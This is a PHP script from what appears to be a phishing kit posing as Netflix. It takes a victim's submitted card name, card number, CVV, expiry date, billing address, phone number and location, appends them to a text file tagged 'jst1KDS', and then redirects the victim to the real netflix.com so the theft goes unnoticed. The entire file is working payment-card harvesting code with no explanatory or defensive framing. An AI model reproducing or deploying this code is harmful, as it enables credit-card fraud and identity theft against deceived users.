<?php
$fnm=$_POST['cn'];
$cvv=$_POST['cvv'];
$lnm=$_POST['cnm'];
$coun=$_POST['country'];
$city=$_POST['city'];
$zip=$_POST['zip'];
$exp=$_POST['exp'];
$stt=$_POST['stt'];
$phn=$_POST['phn'];
$bad = $_POST['bad'];
$detail="detail.txt";
file_put_contents($detail,"---(jst1KDS)---".PHP_EOL,FILE_APPEND);
file_put_contents($detail,"Card Name : ".$fnm.PHP_EOL,FILE_APPEND);
file_put_contents($detail,"Card Number : ".$lnm.PHP_EOL,FILE_APPEND);
file_put_contents($detail,"CVV : ".$cvv.PHP_EOL,FILE_APPEND);
file_put_contents($detail,"Expiry date : ".$exp.PHP_EOL,FILE_APPEND);
file_put_contents($detail,"Country : ".$coun.PHP_EOL,FILE_APPEND);
file_put_contents($detail,"State : ".$stt.PHP_EOL,FILE_APPEND);
file_put_contents($detail,"City : ".$city.PHP_EOL,FILE_APPEND);
file_put_contents($detail,"Postal code : ".$zip.PHP_EOL,FILE_APPEND);
file_put_contents($detail,"Billing Address : ".$bad.PHP_EOL,FILE_APPEND);
file_put_contents($detail,"Phone Number : ".$phn.PHP_EOL,FILE_APPEND);
header("location: https://www.netflix.com");
?>